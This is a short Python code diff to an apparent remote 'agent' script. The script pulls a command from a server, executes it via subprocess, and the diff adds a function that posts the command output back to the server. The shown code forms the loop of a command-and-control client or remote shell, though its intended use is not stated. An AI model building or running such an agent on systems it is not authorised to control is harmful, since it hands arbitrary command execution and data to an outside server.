@@ -27,10 +27,16 @@ def get_command(aId):
     return response.json()
 def execute_command(data):
     return subprocess.check_output(data['Command'].split(' '))
+def report_output(output,command_id):
+    data={'output':output,'id': command_id }
+    requests.post(ServerUrl+"api/agentreportoutput/",data=data)
 #agent_id=register(AgentName)
 #print(self_id)
 json_data= get_command(24)
-print(execute_command(json_data))
+output=execute_command(json_data)
+print(output)
+print(json_data['id'])
+report_output(output,json_data['id'])
 
 
 def fake():
